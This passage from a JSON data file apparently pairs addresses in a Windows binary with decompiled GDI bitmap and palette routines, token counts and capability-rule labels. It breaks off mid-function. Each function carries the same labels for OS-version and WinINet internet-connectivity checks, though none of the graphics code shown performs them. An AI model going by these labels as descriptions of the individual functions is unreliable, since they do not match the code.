        "decompiled_code": "\nvoid fcn.0042524c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x42525c;\n    var_8h = fcn.004152b4();\n    uStack24 = 0x4252ea;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar2 = *(var_8h + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            var_4h = iVar2;\n            puStack32 = 0x425287;\n            var_ch = fcn.00414eec();\n            puStack32 = 0x425292;\n            cVar1 = fcn.00421afc();\n            if (cVar1 != '\\0') {\n                uStack36 = 0x4252c2;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack32 = &stack0xfffffffc;\n                fcn.004253dc();\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x4252c9;\n                uStack36 = 0x4252c1;\n                fcn.00421b58();\n                return;\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4252f1;\n    uStack24 = 0x4252e9;\n    fcn.00415318();\n    return;\n}\n",
        "token_count": 450
    },
    "004252f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004252f8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        puStack20 = 0x425311;\n        iVar1 = fcn.004152b4();\n        uStack24 = 0x425368;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        iVar1 = *(iVar1 + 8) + -1;\n        puStack20 = &stack0xfffffffc;\n        if (-1 < iVar1) {\n            do {\n                iVar2 = fcn.00414eec();\n                if ((*(iVar2 + 0x58) != 0) && (*(*(*(iVar2 + 0x58) + 0x28) + 8) == in_EAX)) {\n                    fcn.004253dc();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x42536f;\n        uStack24 = 0x425367;\n        fcn.00415318();\n        return;\n    }\n    return;\n}\n",
        "token_count": 311
    },
    "004253dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004253dc(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 4) != 0) {\n        puStack16 = 0x4253f9;\n        fcn.00421928();\n        uStack20 = 0x425470;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        if (*(in_EAX + 0x5c) != 0) {\n            puStack16 = &stack0xfffffffc;\n            sub.gdi32.dll_SelectObject(*(in_EAX + 4), *(in_EAX + 0x5c));\n        }\n        if (*(in_EAX + 0x60) != 0) {\n            sub.gdi32.dll_SelectPalette(*(in_EAX + 4), *(in_EAX + 0x60), 0xffffffff);\n        }\n        uVar1 = *(in_EAX + 4);\n        fcn.00421d14();\n        sub.gdi32.dll_DeleteDC();\n        fcn.004152c8();\n        *in_FS_OFFSET = uVar1;\n        fcn.00421b58(0x425477);\n        return;\n    }\n    return;\n}\n",
        "token_count": 320
    },
    "0042547c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042547c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x58) != 0) {\n        puStack20 = 0x42549a;\n        fcn.00421928();\n        uStack24 = 0x42555b;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        fcn.00426890();\n        fcn.004252f8();\n        fcn.00426990();\n        uVar2 = sub.gdi32.dll_CreateCompatibleDC(0);\n        iVar1 = *(*(*(in_EAX + 0x58) + 0x28) + 8);\n        if (iVar1 == 0) {\n            *(in_EAX + 0x5c) = 0;\n        }\n        else {\n            in_stack_ffffffd8 = uVar2;\n            uVar3 = sub.gdi32.dll_SelectObject(uVar2, iVar1);\n            *(in_EAX + 0x5c) = uVar3;\n        }\n        iVar1 = *(*(*(in_EAX + 0x58) + 0x28) + 0x10);\n        if (iVar1 == 0) {\n            *(in_EAX + 0x60) = 0;\n        }\n        else {\n            uVar3 = sub.gdi32.dll_SelectPalette(uVar2, iVar1, 0xffffffff);\n            *(in_EAX + 0x60) = uVar3;\n            sub.gdi32.dll_RealizePalette(uVar2);\n        }\n        fcn.00421d14();\n        fcn.0041522c();\n        *in_FS_OFFSET = in_stack_ffffffd8;\n        fcn.00421b58(0x425562);\n        return;\n    }\n    return;\n}\n",
        "token_count": 477
    },
    "0042556c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042556c(void)\n\n{\n    uint *in_EAX;\n    \n    if ((in_EAX != NULL) && (in_EAX[1] = in_EAX[1] + -1,  in_EAX[1] == 0)) {\n        (***in_EAX)();\n        fcn.00403f58();\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "004256f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004256f0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x28) & 3) != 0) && (*(in_EAX + 0x40) == 0)) {\n        if (*(in_EAX + 0x26) == 0x10) {\n            *(in_EAX + 0x40) = 0xf800;\n            *(in_EAX + 0x44) = 0x7e0;\n            *(in_EAX + 0x48) = 0x1f;\n        }\n        else if (*(in_EAX + 0x26) == 0x20) {\n            *(in_EAX + 0x40) = 0xff0000;\n            *(in_EAX + 0x44) = 0xff00;\n            *(in_EAX + 0x48) = 0xff;\n        }\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "0042573c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042573c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uchar *puVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t in_EDX;\n    uint32_t uVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t *in_FS_OFFSET;\n    uint *puStack312;\n    int32_t iStack308;\n    uchar *puStack304;\n    int32_t iStack300;\n    int32_t iStack296;\n    int32_t iStack292;\n    uint *puStack288;\n    int32_t iStack272;\n    int32_t iStack268;\n    uchar *puStack264;\n    uint *puStack260;\n    int32_t iStack256;\n    int32_t iStack252;\n    uint *puStack248;\n    uint *puStack244;\n    uint *puStack240;\n    uchar *puStack236;\n    int32_t iStack232;\n    int32_t iStack228;\n    uchar *puStack224;\n    int32_t iStack220;\n    uint uStack216;\n    int32_t iStack212;\n    uint uStack208;\n    uchar *puStack204;\n    int32_t iStack200;\n    uint uStack196;\n    uchar *puStack192;\n    int32_t iStack188;\n    uint uStack184;\n    int32_t iStack180;\n    uint uStack176;\n    uint *puStack172;\n    uint lprc;\n    uint lpvObject;\n    int32_t var_84h;\n    int32_t var_80h;\n    int32_t var_74h;\n    int32_t var_70h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint *pbmi;\n    int32_t var_20h;\n    int32_t hdcDest;\n    int32_t hdc;\n    uint var_14h;\n    uint var_10h;\n    int32_t hpal;\n    int32_t var_8h;\n    int32_t hgdiobj;\n    \n    puStack236 = &stack0xfffffffc;\n    var_10h = 0;\n    if (((*(arg_ch + 0x18) == 0) || ((*(arg_ch + 0x1c) != 0 && (*(arg_ch + 0x20) != 0)))) &&\n       ((*(arg_ch + 0x18) != 0 || ((*(arg_ch + 4) != 0 && (*(arg_ch + 8) != 0)))))) {\n        puStack172 = 0x4257a4;\n        var_8h = in_EDX;\n        hgdiobj = in_EAX;\n        fcn.004252f8();\n        var_70h = 0;\n        if (hgdiobj != 0) {\n            puStack172 = &fcn.0042573c::lpvObject;\n            uStack176 = 0x54;\n            iStack180 = hgdiobj;\n            uStack184 = 0x4257c1;\n            iVar4 = sub.gdi32.dll_GetObjectA();\n            if (iVar4 < 0x18) {\n                uStack184 = 0x4257cb;\n                fcn.00421f70();\n            }\n        }\n        uStack184 = 0;\n        iStack188 = 0x4257d2;\n        sub.user32.dll_GetDC();\n        iStack188 = 0x4257d7;\n        iStack188 = fcn.00422090();\n        puStack192 = 0x4257e3;\n        hdc = iStack188;\n        sub.gdi32.dll_CreateCompatibleDC();\n        puStack192 = 0x4257e8;\n        hdcDest = fcn.00422090();\n        uStack196 = 0x425d8a;\n        iStack200 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff38;\n        if (*(arg_ch + 0x18) < 0x28) {\n            if ((*(arg_ch + 0x10) | *(arg_ch + 0x12)) == 1) {\n                puStack204 = NULL;\n                uStack208 = 1;\n                iStack212 = 1;\n                uStack216 = *(arg_ch + 8);\n                iStack220 = *(arg_ch + 4);\n                puStack224 = 0x42582f;\n                puStack192 = &stack0xfffffffc;\n                sub.gdi32.dll_CreateBitmap();\n                puStack224 = 0x425834;\n                var_10h = fcn.00422090();\n            }\n            else {\n                puStack204 = *(arg_ch + 8);\n                uStack208 = *(arg_ch + 4);\n                iStack212 = hdc;\n                uStack216 = 0x425853;\n                puStack192 = &stack0xfffffffc;\n                sub.gdi32.dll_CreateCompatibleBitmap();\n                uStack216 = 0x425858;\n                var_10h = fcn.00422090();\n            }\n            uStack216 = 0x425aa3;\n            fcn.00422090();\n            uStack216 = var_10h;\n            iStack220 = hdcDest;\n            puStack224 = 0x425ab0;\n            sub.gdi32.dll_SelectObject();\n            puStack224 = 0x425ab5;\n            var_14h = fcn.00422090();\n            iStack228 = 0x425d3b;\n            iStack232 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff18;\n            puStack240 = 0x425d2a;\n            puStack244 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff0c;\n            var_34h = 0;\n            uVar8 = 0;\n            puVar1 = &stack0xfffffffc;\n            puStack224 = &stack0xfffffffc;\n            if (hpal != 0) {\n                puStack248 = NULL;\n                iStack252 = hpal;\n                iStack256 = hdcDest;\n                puStack260 = 0x425af0;\n                puStack224 = &stack0xfffffffc;\n                var_34h = sub.gdi32.dll_SelectPalette();\n                puStack260 = hdcDest;\n                puStack264 = 0x425afc;\n                sub.gdi32.dll_RealizePalette();\n                puVar1 = puStack236;\n            }\n            puStack236 = puVar1;\n            iStack268 = 0x425d08;\n            iStack272 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffef0;\n            if (arg_8h == 0) {\n                puStack288 = NULL;\n                iStack292 = 0;\n                iStack296 = hdcDest;\n                iStack300 = 0x425be9;\n                puStack264 = &stack0xfffffffc;\n                sub.gdi32.dll_PatBlt();\n            }\n            else {\n                puStack264 = &stack0xfffffffc;\n                fcn.00421508();\n                puStack288 = 0x425b3d;\n                fcn.00413a94(&fcn.0042573c::lprc, *(arg_ch + 8));\n                puStack288 = &fcn.0042573c::lprc;\n                iStack292 = hdcDest;\n                iStack296 = 0x425b4d;\n                sub.user32.dll_FillRect();\n                iStack296 = 0x425b5b;\n                iStack296 = fcn.0042074c();\n                iStack300 = hdcDest;\n                puStack304 = 0x425b65;\n                sub.gdi32.dll_SetTextColor();\n                puStack304 = 0x425b70;\n                fcn.004214cc();\n                puStack304 = 0x425b75;\n                puStack304 = fcn.0042074c();\n                iStack308 = hdcDest;\n                puStack312 = 0x425b7f;\n                sub.gdi32.dll_SetBkColor();\n                if ((*(arg_ch + 0x26) == 1) && (*(arg_ch + 0x14) != 0)) {\n                    puStack312 = 0x425ba0;\n                    var_30h = fcn.0042074c();\n                    puStack312 = 0x425bae;\n                    fcn.004214cc();\n                    puStack312 = 0x425bb3;\n                    var_2ch = fcn.0042074c();\n                    puStack312 = &fcn.0042573c::var_30h;\n                    sub.gdi32.dll_SetDIBColorTable(hdcDest, 0, 2);\n                }\n            }\n            if (hgdiobj != 0) {\n                iStack300 = hdc;\n                puStack304 = 0x425bfc;\n                sub.gdi32.dll_CreateCompatibleDC();\n                puStack304 = 0x425c01;\n                var_20h = fcn.00422090();\n                iStack308 = 0x425cde;\n                puStack312 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffec8;\n                puStack304 = &stack0xfffffffc;\n                sub.gdi32.dll_SelectObject(var_20h, hgdiobj);\n                uVar5 = fcn.00422090();\n                if (var_8h != 0) {\n                    uVar8 = sub.gdi32.dll_SelectPalette(var_20h, var_8h, 0);\n                    sub.gdi32.dll_RealizePalette(var_20h);\n                }\n                if (arg_8h != 0) {\n                    uVar6 = fcn.0042074c();\n                    sub.gdi32.dll_SetTextColor(var_20h, uVar6);\n                    fcn.004214cc();\n                    uVar6 = fcn.0042074c();\n                    sub.gdi32.dll_SetBkColor(var_20h, uVar6);\n                }\n                sub.gdi32.dll_BitBlt(hdcDest, 0, 0, *(arg_ch + 4), *(arg_ch + 8), var_20h, 0, 0, 0xcc0020);\n                if (var_8h != 0) {\n                    sub.gdi32.dll_SelectPalette(var_20h, uVar8, 0xffffffff);\n                }\n                iVar4 = var_20h;\n                sub.gdi32.dll_SelectObject(var_20h, uVar5);\n                fcn.00422090();\n                *in_FS_OFFSET = iVar4;\n                uVar8 = sub.gdi32.dll_DeleteDC(var_20h, 0x425ce5);\n                return uVar8;\n            }\n            uVar8 = 0;\n            *in_FS_OFFSET = iStack296;\n            puStack288 = 0x425d0f;\n            if (hpal != 0) {\n                iStack292 = 0xffffffff;\n                iStack296 = var_34h;\n                iStack300 = hdcDest;\n                puStack304 = 0x425d07;\n                uVar8 = sub.gdi32.dll_SelectPalette();\n            }\n            return uVar8;\n        }\n        puStack204 = 0x42586a;\n        puStack192 = &stack0xfffffffc;\n        pbmi = fcn.00402ce4();\n        uStack208 = 0x425a94;\n        iStack212 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff2c;\n        *(arg_ch + 0x18) = 0x28;\n        *(arg_ch + 0x24) = 1;\n        puStack204 = &stack0xfffffffc;\n        if (*(arg_ch + 0x26) == 0) {\n            uStack216 = 0xc;\n            iStack220 = hdc;\n            puStack224 = 0x4258a3;\n            puStack204 = &stack0xfffffffc;\n            iVar2 = sub.gdi32.dll_GetDeviceCaps();\n            puStack224 = 0xe;\n            iStack228 = hdc;\n            iStack232 = 0x4258b0;\n            iVar3 = sub.gdi32.dll_GetDeviceCaps();\n            *(arg_ch + 0x26) = iVar2 * iVar3;\n        }\n        puVar9 = arg_ch + 0x18;\n        puVar10 = pbmi;\n        for (iVar4 = 10; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar10 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar10 = puVar10 + 1;\n        }\n        *(arg_ch + 4) = *(arg_ch + 0x1c);\n        *(arg_ch + 8) = *(arg_ch + 0x20);\n        if (*(arg_ch + 0x26) < 9) {\n            if ((*(arg_ch + 0x26) == 1) && ((hgdiobj == 0 || (var_74h == 0)))) {\n                pbmi[10] = 0;\n                pbmi[0xb] = 0xffffff;\n            }\n            else if (hpal == 0) {\n                if (hgdiobj != 0) {\n                    iStack232 = hgdiobj;\n                    puStack236 = hdcDest;\n                    puStack240 = 0x42595a;\n                    var_14h = sub.gdi32.dll_SelectObject();\n                    if ((var_70h == 0) || (var_74h == 0)) {\n                        puStack240 = NULL;\n                        puStack244 = pbmi;\n                        puStack248 = NULL;\n                        uVar7 = *(arg_ch + 0x20) >> 0x1f;\n                        iStack252 = (*(arg_ch + 0x20) ^ uVar7) - uVar7;\n                        iStack256 = 0;\n                        puStack260 = hgdiobj;\n                        puStack264 = hdcDest;\n                        iStack268 = 0x4259ab;\n                        sub.gdi32.dll_GetDIBits();\n                    }\n                    else {\n                        puStack240 = pbmi + 10;\n                        puStack244 = 0x100;\n                        puStack248 = NULL;\n                        iStack252 = hdcDest;\n                        iStack256 = 0x425980;\n                        uVar8 = sub.gdi32.dll_GetDIBColorTable();\n                        *(arg_ch + 0x38) = uVar8;\n                    }\n                    puStack224 = var_14h;\n                    iStack228 = hdcDest;\n                    iStack232 = 0x4259b8;\n                    sub.gdi32.dll_SelectObject();\n                }\n            }\n            else {\n                iStack232 = 0x42593e;\n                fcn.0042282c();\n            }\n        }\n        else if (((*(arg_ch + 0x26) == 0x10) || (*(arg_ch + 0x26) == 0x20)) && ((*(arg_ch + 0x28) & 3) != 0)) {\n            iStack232 = 0x4259e1;\n            fcn.004256f0();\n            iStack232 = 0x4259f7;\n            fcn.00402ee0();\n        }\n        iStack232 = 0;\n        puStack236 = NULL;\n        puStack240 = &fcn.0042573c::var_28h;\n        puStack244 = NULL;\n        puStack248 = pbmi;\n        iStack252 = hdc;\n        iStack256 = 0x425a0e;\n        sub.gdi32.dll_CreateDIBSection();\n        iStack256 = 0x425a13;\n        var_10h = fcn.00422090();\n        if (var_28h == 0) {\n            iStack256 = 0x425a21;\n            fcn.00421fe8();\n        }\n        if ((((hgdiobj == 0) || (*(arg_ch + 0x1c) != var_84h)) || (*(arg_ch + 0x20) != var_80h)) ||\n           (*(arg_ch + 0x26) < 9)) {\n            *in_FS_OFFSET = iStack252;\n            puStack244 = 0x425a9b;\n            puStack248 = 0x425a93;\n            uVar8 = fcn.00402d00();\n            return uVar8;\n        }\n        iStack256 = 0;\n        puStack260 = pbmi;\n        puStack264 = var_28h;\n        uVar7 = *(arg_ch + 0x20) >> 0x1f;\n        iStack268 = (*(arg_ch + 0x20) ^ uVar7) - uVar7;\n        iStack272 = 0;\n        sub.gdi32.dll_GetDIBits();\n        fcn.00404878();\n        fcn.00404878();\n    }\n    return var_10h;\n}\n",
        "token_count": 3767
    },
    "00425da0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00425da0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack1064;\n    int32_t iStack1060;\n    uchar *puStack1056;\n    int32_t iStack1052;\n    uint uStack1048;\n    uchar *puStack1044;\n    uint uStack1040;\n    \n    puStack1044 = &stack0xfffffbf0;\n    uVar2 = 0;\n    if (in_EAX != 0) {\n        uStack1040 = 0;\n        uStack1048 = 4;\n        puStack1056 = 0x425dbe;\n        iStack1052 = in_EAX;\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if ((iVar1 != 0) && (iStack1052 != 0)) {\n            uStack1048 = CONCAT22(iStack1052, 0x300);\n            puStack1056 = &stack0xfffffbec;\n            iStack1060 = iStack1052;\n            uStack1064 = 0;\n            sub.gdi32.dll_GetPaletteEntries();\n            uVar2 = sub.gdi32.dll_CreatePalette(&stack0xfffffbd8);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 297
    },
    "00425e04": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00425e04(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffec8;\n    int32_t in_stack_ffffff24;\n    int32_t iStack204;\n    uint uStack200;\n    uchar *puStack196;\n    int32_t iStack192;\n    int32_t iStack188;\n    int32_t iStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    int32_t iStack160;\n    uint uStack156;\n    int32_t iStack152;\n    uint uStack148;\n    uchar *puStack144;\n    uint uStack136;\n    uint *puStack132;\n    uint lpvObject;\n    uint nWidth;\n    uint nHeight;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    char var_11h;\n    int32_t hdcDest;\n    int32_t hdc;\n    int32_t var_8h;\n    int32_t hgdiobj;\n    \n    hgdiobj = 0;\n    if (in_EAX != 0) {\n        puStack132 = &fcn.00425e04::lpvObject;\n        uStack136 = 0x54;\n        puStack144 = 0x425e2c;\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if (iVar1 != 0) {\n            puStack144 = 0x425e3b;\n            fcn.004252f8();\n            var_8h = 0;\n            hdcDest = 0;\n            uStack148 = 0x425fff;\n            iStack152 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff68;\n            uStack156 = 0;\n            iStack160 = 0x425e5a;\n            puStack144 = &stack0xfffffffc;\n            sub.user32.dll_GetDC();\n            iStack160 = 0x425e5f;\n            iStack160 = fcn.00422090();\n            uStack164 = 0x425e6b;\n            var_8h = iStack160;\n            sub.gdi32.dll_CreateCompatibleDC();\n            uStack164 = 0x425e70;\n            hdcDest = fcn.00422090();\n            uStack164 = 0;\n            uStack168 = 1;\n            uStack172 = 1;\n            uStack176 = nHeight;\n            uStack180 = nWidth;\n            iStack184 = 0x425e86;\n            hgdiobj = sub.gdi32.dll_CreateBitmap();\n            if (hgdiobj != 0) {\n                iStack188 = hdcDest;\n                iStack192 = 0x425ea0;\n                iStack184 = hgdiobj;\n                var_1ch = sub.gdi32.dll_SelectObject();\n                if (param_1 != 0x1fffffff) {\n                    iStack192 = var_8h;\n                    puStack196 = 0x425ed0;\n                    sub.gdi32.dll_CreateCompatibleDC();\n                    puStack196 = 0x425ed5;\n                    hdc = fcn.00422090();\n                    uStack200 = 0x425fb7;\n                    iStack204 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffff34;\n                    if (var_5ch == 0) {\n                        var_11h = '\\0';\n                        puStack196 = &stack0xfffffffc;\n                    }\n                    else {\n                        var_11h = '\\x01';\n                        var_58h = 0;\n                        puStack196 = &stack0xfffffffc;\n                        in_EAX = fcn.0042573c(0, &fcn.00425e04::lpvObject);\n                    }\n                    var_18h = sub.gdi32.dll_SelectObject(hdc, in_EAX);\n                    if (param_2 != 0) {\n                        sub.gdi32.dll_SelectPalette(hdc, param_2, 0);\n                        sub.gdi32.dll_RealizePalette(hdc);\n                        sub.gdi32.dll_SelectPalette(hdcDest, param_2, 0);\n                        sub.gdi32.dll_RealizePalette(hdcDest);\n                    }\n                    uVar2 = sub.gdi32.dll_SetBkColor(hdc, param_1);\n                    sub.gdi32.dll_BitBlt(hdcDest, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xcc0020);\n                    sub.gdi32.dll_SetBkColor(hdc, uVar2);\n                    if (var_18h != 0) {\n                        in_stack_fffffec8 = hdc;\n                        sub.gdi32.dll_SelectObject(hdc, var_18h);\n                    }\n                    if (var_11h != '\\0') {\n                        sub.gdi32.dll_DeleteObject(in_EAX);\n                    }\n                    *in_FS_OFFSET = in_stack_fffffec8;\n                    uVar2 = sub.gdi32.dll_DeleteDC(hdc, 0x425fbe);\n                    return uVar2;\n                }\n                iStack192 = 0x42;\n                puStack196 = nHeight;\n                uStack200 = nWidth;\n                iStack204 = 0;\n                sub.gdi32.dll_PatBlt(hdcDest, 0);\n                if (var_1ch != 0) {\n                    in_stack_ffffff24 = hdcDest;\n                    sub.gdi32.dll_SelectObject(hdcDest, var_1ch);\n                }\n            }\n            uVar2 = 0;\n            *in_FS_OFFSET = in_stack_ffffff24;\n            if (hdcDest != 0) {\n                uVar2 = sub.gdi32.dll_DeleteDC(hdcDest, 0x426006);\n            }\n            if (var_8h != 0) {\n                uVar2 = sub.user32.dll_ReleaseDC(0, var_8h);\n            }\n            return uVar2;\n        }\n    }\n    return hgdiobj;\n}\n",
        "token_count": 1346
    },
    "00426010": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00426010(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0042322c();\n    in_EAX[0xd] = 0x20000000;\n    iVar1 = fcn.00403f28();\n    in_EAX[10] = iVar1;\n    fcn.00425568();\n    if (*0x490b64 != '\\0') {\n        (**(*in_EAX + 0x70))();\n    }\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 218
    },
    "00426314": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426314(int32_t *param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t arg_2ch;\n    int32_t arg_28h;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *in_FS_OFFSET;\n    uint uVar7;\n    uint uStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint *puStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint uStack84;\n    uint *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_11h;\n    uint var_dh;\n    char var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar6 = in_EAX[10];\n    uStack48 = 0x426336;\n    var_4h = param_2;\n    fcn.00421d68();\n    uStack48 = 0x42633d;\n    fcn.00426990();\n    var_8h = 0;\n    var_9h = 0;\n    iVar3 = *(iVar6 + 0x10);\n    if (iVar3 != 0) {\n        uStack48 = 0xffffffff;\n        uStack56 = *(var_4h + 4);\n        uStack60 = 0x42635c;\n        iStack52 = iVar3;\n        var_8h = sub.gdi32.dll_SelectPalette();\n        uStack60 = *(var_4h + 4);\n        uStack64 = 0x42636b;\n        sub.gdi32.dll_RealizePalette();\n    }\n    uStack64 = 0xc;\n    uStack68 = *(var_4h + 4);\n    uStack72 = 0x42637d;\n    var_9h = iVar3 != 0;\n    uStack72 = sub.gdi32.dll_GetDeviceCaps();\n    uStack76 = 0xe;\n    puStack80 = *(var_4h + 4);\n    uStack84 = 0x42638c;\n    iVar3 = sub.gdi32.dll_GetDeviceCaps();\n    if ((puStack80 * iVar3 < 9) && (puStack80 * iVar3 < *(iVar6 + 0x2a) * *(iVar6 + 0x28))) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n    }\n    if (bVar1) {\n        puStack80 = &fcn.00426314::var_11h;\n        uStack84 = *(var_4h + 4);\n        puStack88 = 0x4263bf;\n        sub.gdi32.dll_GetBrushOrgEx();\n        puStack88 = 0x4;\n        uStack92 = *(var_4h + 4);\n        puStack96 = 0x4263cd;\n        sub.gdi32.dll_SetStretchBltMode();\n        puStack96 = &fcn.00426314::var_11h;\n        puStack100 = var_dh;\n        uStack104 = var_11h;\n        uStack108 = *(var_4h + 4);\n        sub.gdi32.dll_SetBrushOrgEx();\n    }\n    else {\n        puStack80 = 